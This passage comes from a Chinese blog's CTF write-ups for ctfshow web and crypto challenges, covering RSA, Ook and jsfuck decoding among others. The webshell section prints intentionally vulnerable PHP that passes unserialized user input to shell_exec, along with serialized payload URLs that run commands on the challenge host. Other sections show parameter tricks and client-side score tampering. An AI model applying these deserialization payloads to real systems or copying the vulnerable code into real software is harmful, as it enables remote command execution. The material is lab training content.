<p>其中，check() 函数的作用是检查输入的字符串中是否包含字母、分号、括号等特殊字符。如果没有包含这些字符，则返回 true，否则返回<br>false。</p>
<p>不过在第 6 行代码中，使用了 assert() 函数来判断 $_GET[‘num’] 是否等于<br>1919810，如果不等于就会输出一段提示信息并终止程序运行。注意到 assert()<br>函数是一个非常危险的函数，因为它会将字符串参数当作代码执行，因此如果在输入 $_GET[‘num’]<br>的时候传入了一些特殊字符，就可能导致代码执行漏洞。</p>
<p>由于代码中包含了 flag.php 文件，因此我们无法得知 $flag 变量的值。不过可以尝试构造符合条件的 $_GET[‘num’]<br>参数，使得程序输出 $flag 变量的值。注意到 check()<br>函数中只检查了字母、分号、括号等特殊字符，因此可以使用数字、加号、减号等常规字符来构造参数。</p>
</blockquote>
<h2 id="TapTapTap"><a href="#TapTapTap" class="headerlink" title="TapTapTap"></a>TapTapTap</h2><blockquote>
<p>网页游戏类的题目直接查看其源代码。</p>
</blockquote>
<p>在js文件里看到有base64加密的内容。解码看看。<br><img src="https://img-blog.csdnimg.cn/5c5b3b1d2ec643d0a963c33a2fa414c7.png" alt="2"></p>
<blockquote>
<p>Your flag is in &#x2F;secret_path_you_do_not_know&#x2F;secretfile.txt</p>
</blockquote>
<p>直接访问得到flag。</p>
<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><strong>考点：反序列化</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Webshell</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo "Hello World!"'</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$serializecmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$unserializecmd</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serializecmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$unserializecmd</span><span class="token operator">-></span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>代码的意思是定义了一个webshell类，里面包含一个公共属性（<strong>cmd</strong>）和三个公共方法（**_construct()，init()，exec()<strong>）其中init()方法在构造函数_construct()中被调用，目的是用来检查cmd值中是否含有参数</strong>flag<strong>如果含有，则输出</strong>Hello World!<strong>，反之，则调用exec()方法来执行</strong>$cmd**。<br><img src="https://img-blog.csdnimg.cn/b09519fa51e74250a34f9e317b3884ce.png" alt="1"><br>具体来说，可以执行如下的代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Webshell</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ls"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$W</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Webshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$W</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p> 得到<strong>O:8:”Webshell”:1:{s:3:”cmd”;s:2:”ls”;}</strong></p>
<blockquote>
<p>这个字符串表示一个包含一个名为 cmd 的属性的 Webshell 类对象。s:3:”cmd” 表示属性名字的长度为 3，s:2:”ls” 表示 $cmd 属性的值为 “ls”，它的长度为 2。通过将这个字符串传递给 unserialize() 函数，我们可以将其反序列化为一个 Webshell 对象，并执行其中包含的命令。</p>
</blockquote>
<p>url：<code>http://a45cc446-ca14-40ca-92e4-8da67a3cc623.challenge.ctf.show/?cmd=O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</code><br><img src="https://img-blog.csdnimg.cn/4cc0a2e1e93546adba733d88ea1641e3.png" alt="3"><br>url：<code>http://a45cc446-ca14-40ca-92e4-8da67a3cc623.challenge.ctf.show/?cmd=O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:7:&quot;tac fl*&quot;;&#125;</code><br><img src="https://img-blog.csdnimg.cn/4df37ceb5f164c95b99945642caeb496.png" alt="2"></p>
<h2 id="化零为整"><a href="#化零为整" class="headerlink" title="化零为整"></a>化零为整</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>

<span class="token variable">$result</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;=</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你太长了！！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$result</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">===</span><span class="token string double-quoted-string">"大牛"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>count()用来统计get传入参数的个数，如果传入**?a&#x3D;1<strong>，那就是一个参数，传入</strong>?a&#x3D;1&amp;b&#x3D;2<strong>，那就是两个参数。<br>strlen()用来返回字符串的长度，如果大于1，那就执行die，否则将传入的get参数拼接到result中。<br>然后如果result&#x3D;&#x3D;&#x3D;大牛，那就输出flag。<br><strong>在这里我们需要知道</strong><br><code>大牛</code>在url编码后是<code>%E5%A4%A7%E7%89%9B</code>一个%E5占用一个字节，所以我们可以通过将</strong>大牛<strong>进行url编码然后</strong>for函数**进行拼接得到flag。一个汉字有3位url编码，然后用1-6</p>
<p>payload<code>http://da499d91-835d-4543-9c2e-faa0b2ea3723.challenge.ctf.show?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</code>之后得到flag。</p>
<h2 id="无一幸免"><a href="#无一幸免" class="headerlink" title="无一幸免"></a>无一幸免</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个题的意义是啥呢？<br>我就payload<code>?0=1</code>，flag就出来了。</p>
<h2 id="传说之下（雾）"><a href="#传说之下（雾）" class="headerlink" title="传说之下（雾）"></a>传说之下（雾）</h2><p><img src="https://img-blog.csdnimg.cn/86faa25095144eb18cf9de64afbcc1da.png" alt="1">游戏界面，那就找一下js代码。<br><img src="https://img-blog.csdnimg.cn/71650c9a07134eb5b6c38dbbc521594f.png" alt="1"><br>他说分数达到2077后就给flag。在前端改一下试试，<br><img src="https://img-blog.csdnimg.cn/b6106be08f764e75a1e4894ec5956cf4.png" alt="1"><br>发现不行。再好好找一下，在js文件中搜索score。找到关键点<br><img src="https://img-blog.csdnimg.cn/8fb09945e91f47979007d09792c3f4d9.png" alt="2"><br>又学到了一个，在此处下断点（点击275即可），<br><img src="https://img-blog.csdnimg.cn/5e5a7f6f549649f78e132f1eea8d43e9.png" alt="3"><br>然后开始游戏等到吃了一个苹果的时候，程序会在断点停下，<br><img src="https://img-blog.csdnimg.cn/f4ee69e852294ad4a6759ec9dc942294.png" alt="4"><br>在控制台输入<code>var nowScore = this.score += 2078</code>回车，<br><img src="https://img-blog.csdnimg.cn/e683ba59ae094d319d18982091228622.png" alt="5"><br>然后继续游戏<br><img src="https://img-blog.csdnimg.cn/6574abd9ddaa4ac6888479fdb6939508.png" alt="6"><br>得到flag。</p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="0x36d"><a href="#0x36d" class="headerlink" title="0x36d"></a>0x36d</h2><p>😫🙄👰😰👣🙋😱👧👌👷👯👩😴👖👫👚🙃👹👏👏😶👳😫👕🙂🙊👵👶👨👰👮🙉👶👵👸👲👺👮👑😶👴😫🙊👫😴👬👹👤👑😱👗🙃👐😶</p>
<p><strong>提示： 有没有一种可能，标题就是密码？</strong><br>试了一下base100解密，不行。那就是<a href="https://txtmoji.com/">emojis解密</a>，需要密码，看题目，0x代表十六进制解密36d得到<strong>877</strong>，成功得到flag。</p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-Crypto</title>
    <url>/2023/02/26/ctfshow-Crypto/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="jsfuck加密"><a href="#jsfuck加密" class="headerlink" title="jsfuck加密"></a>jsfuck加密</h2><p><strong>jsfuck加密</strong><br>打开控制台，复制粘贴回车得到flag。<br><img src="https://img-blog.csdnimg.cn/9bf0f33ceb1f4c35a6b09386746ae59c.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/687b19df85a746f58df6d8da3f836637.png" alt="2"></p>
<h2 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h2><p>下载后用记事本打开，复制粘贴到控制台。得到flag。</p>
<h2 id="crypto4"><a href="#crypto4" class="headerlink" title="crypto4"></a>crypto4</h2><p><strong>已知 p q e 求 d</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
p <span class="token operator">=</span> <span class="token number">447685307</span>
q <span class="token operator">=</span> <span class="token number">2037</span>
e <span class="token operator">=</span> <span class="token number">17</span>
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/64725cd54d814229a18167911ca6c9d6.png" alt="3"></p>
<h2 id="crypto5"><a href="#crypto5" class="headerlink" title="crypto5"></a>crypto5</h2><p><img src="https://img-blog.csdnimg.cn/ae3ca93b1ac246b097cc59ba826eb835.png" alt="5"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 已知(p, q, e,c)，求m。</span>
<span class="token keyword">import</span> gmpy2
p<span class="token operator">=</span><span class="token number">447685307</span>
q<span class="token operator">=</span><span class="token number">2037</span>
e<span class="token operator">=</span><span class="token number">17</span>
c<span class="token operator">=</span><span class="token number">704796792</span>

phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>
m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token operator">*</span>q<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="rabbit解密"><a href="#rabbit解密" class="headerlink" title="rabbit解密"></a>rabbit解密</h2><p><img src="https://img-blog.csdnimg.cn/e94a5d5a735d43d880be0981bebbbbdc.png" alt="6"></p>
<p><a href="http://www.jsons.cn/rabbitencrypt/">rabbit解密</a></p>
<h2 id="ook加密"><a href="#ook加密" class="headerlink" title="ook加密"></a>ook加密</h2><blockquote>
<p>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook?<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?<br>Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.<br>Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook. Ook.<br>Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.<br>Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!<br>Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook. Ook? Ook. </p>
</blockquote>
<p>看不懂啊？原来是<strong>ook加密</strong></p>
<p>这是一种很不常见的编码Ook！</p>
